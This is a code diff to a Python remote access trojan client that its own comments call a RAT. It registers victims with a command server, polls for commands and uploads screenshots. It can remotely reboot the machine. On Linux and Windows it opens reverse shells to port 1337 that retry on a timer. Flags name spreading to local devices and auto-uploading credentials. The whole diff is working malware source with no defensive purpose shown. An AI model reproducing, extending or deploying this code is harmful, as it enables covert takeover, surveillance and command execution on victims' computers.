@@ -1,5 +1,5 @@
-from os import uname
-from platform import platform
+import platform
+import os
 import subprocess
 import requests
 import time
@@ -8,32 +8,53 @@ import shlex
 import random
 import getpass
 import platform
+import pyautogui
+import datetime
+import PIL
+
 
 ### WEB SERVER ADDRESS
-_WEB_SERVER = "192.168.1.6:5000"
+_WEB_SERVER = "192.168.1.6:3000"
 
 root = 0
-rshell = 1
+
+# PAYLOAD OPTIONS #
+
+### ENABLE REMOTE SHELL ###
+_RSHELL_OPT = 1
+### ATTEMPT TO SPREAD TO A LOCAL PC OR DEVICE ###
+_SPREAD_OPT = 0
+_FAST_ROOT_OPT = 0
+_AUTO_UPLOAD_CREDS_OPT = 0
 
 _REG_URL = 'http://{0}/register'.format(_WEB_SERVER)
 _CHECK_IF_REGISTERED = 'http://{0}/check_if_registered'.format(_WEB_SERVER)
 _CHECK_FOR_COMMAND = 'http://{0}/command'.format(_WEB_SERVER)
+_OS = platform.uname()[0]
 
-print(platform.uname()[0])
+
+
 #   GET RATS PUBLIC IP ADDRESS  AND RETURN IT   #
 def get_ip():
+    
     try:
-        proc = requests.get('http://{0}/getip'.format(_WEB_SERVER))
-        return proc.content.decode('utf8')
+            proc = requests.get('http://{0}/getip'.format(_WEB_SERVER))
+            return proc.content.decode('utf8')
+
     except Exception as e:
-        print(e)
-
+        
+        pass
+        
 _MY_IP = get_ip()
+while _MY_IP == None:
+    _MY_IP = get_ip()
+    
 
-#   REGISTER RAT TO DATABASE BY GOING TO URL  #
+
+# REGISTER RAT TO DATABASE BY GOING TO URL #
 def register():
     try:
-        requests.get(_REG_URL + '/{0}/{1}'.format(_MY_IP, username))
+        requests.get(_REG_URL + '/{0}/{1}/{2}'.format(_MY_IP, username, _OS))
     except Exception as e:
         pass
 
@@ -43,39 +64,99 @@ def chk_register():
         if requests.get(_CHECK_IF_REGISTERED + '/{0}/{1}'.format(_MY_IP, username)).content.decode('utf8') == 'True':
             return 1
         else:
-            pass
+            return 0
     except requests.exceptions.ConnectionError as e:
-        print(e)
+        
         pass
 
 # GET REVERSE SHELL IP
 
-def get_rshell_ip():
+def get__RSHELL_OPT_ip():
     try:
         proc = requests.get('http://{0}/rshell/{1}/{2}'.format(_WEB_SERVER, _MY_IP, getpass.getuser()))
         return proc.content.decode('utf8')
     except Exception as e:
-        print(e)
+        pass
+        
 
-#   CHECK URL FOR A COMMAND, IF COMMAND IS EMPTY KEEP WAITING #
+### UPLOAD SCREEN SHOT FUNCTION ###
+def upload_screenshot(SCREENSHOT):
+    
+        try:
+            
+            with open(SCREENSHOT, "rb") as f:
+                requests.post("http://{0}/upload/screenshot/{1}/{2}".format(_WEB_SERVER, _MY_IP, username ), files={"file": f})
+            
+        except Exception as e:
+            pass
+        
+
+    
+
+### CHECK URL FOR A COMMAND, IF COMMAND IS EMPTY KEEP WAITING ###
 def wait_for_command():
     try:
-        time.sleep(random.randrange(5))
+        time.sleep(random.randrange(5, 15))
         command = requests.get(_CHECK_FOR_COMMAND + '/{0}/{1}'.format(_MY_IP, username)).content.decode('utf8')
         if command == ' ':
-            print('...')
-        else:
-            exec_command(command)
+            pass
+        
+        if command == "screenshot":
+            if _OS == "Linux":
+                pass
+
+            elif _OS == "Windows":
+                now = datetime.datetime.now() # current date and time
+                date_time = now.strftime("%H_%M_%S")
+
+                _SCREEN_SHOT = pyautogui.screenshot()
+                _SCREEN_SHOT.save(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
+                upload_screenshot(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
+                os.remove(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
+
+        if command == "reboot":
+            if _OS == "Linux":
+                subprocess.call("reboot")
+
+            elif _OS == "Windows":
+                subprocess.call("shutdown -R")
+
+        
+        if command == "record":
+            if _OS == "Linux":
+                pass
+
+            elif _OS == "Windows":
+                pass
+
+
+        if command == "reboot":
+            if _OS == "Linux":
+                pass
+
+            elif _OS == "Windows":
+                subprocess.call("shutdown -R")
+
+        if command == "killswitch":
+            if _OS == "Linux":
+                pass
+
+            elif _OS == "Windows":
+                subprocess.call("shutdown -R")
+
+        
+
+        
     except requests.exceptions.ConnectionError:
         pass
     except FileNotFoundError:
         pass
 
-#   IF RSHELL == 1 ATTEMPT TO START A RSHELL on ctrl + c or z THE RAT STOPS, WILL FIX LATER  #
-def rshell_():
+#   IF _RSHELL_OPT == 1 ATTEMPT TO START A _RSHELL_OPT on ctrl + c or z THE RAT STOPS, WILL FIX LATER  #
+def _RSHELL_OPT_():
     try:
         if platform.uname()[0] == "Linux":
-                exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(get_rshell_ip()))
+                exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(get__RSHELL_OPT_ip()))
         elif platform.uname()[0] == "Windows":
             import os,socket,subprocess,threading;
             def s2p(s, p):
@@ -90,7 +171,7 @@ def rshell_():
                     s.send(p.stdout.read(1))
 
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect(("{0}".format(get_rshell_ip()), 1337))
+            s.connect(("{0}".format(get__RSHELL_OPT_ip()), 1337))
             p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
             s2p_thread = threading.Thread(target=s2p, args=[s, p])
             s2p_thread.daemon = True
@@ -101,11 +182,17 @@ def rshell_():
             try:
                 p.wait()
             except KeyboardInterrupt:
-                s.close() 
-
-    except Exception:
-        time.sleep(5)
-        threading.Thread(target=rshell_).start()
+                s.close()
+                timer = threading.Timer(60, _RSHELL_OPT_)
+                timer.start()
+                pass
+    except Exception as e:
+        print(e)
+        timer = threading.Timer(60, _RSHELL_OPT_)
+        timer.start()
+        pass
+        
+        
         
 #   EXECS SHELL COMMAND FROM URL COMMAND(PIPING DOESNT WORK) WILL FIX  #
 def exec_command(command):
@@ -116,15 +203,18 @@ username = getpass.getuser()
 if username == 'root':
     root = 1
 
-if rshell == 1:
-    threading.Thread(target=rshell_).start()
-
 while 1:
-    time.sleep(5)
     if chk_register() == 1:
+        if _RSHELL_OPT == 1:
+                
+                timer = threading.Timer(60, _RSHELL_OPT_)
+                timer.start()
         while 1:
+               #threading.Thread(target=_RSHELL_OPT_).start()
             wait_for_command()
+            
     else:
-        pass 
+        register()
+        continue 
 
     
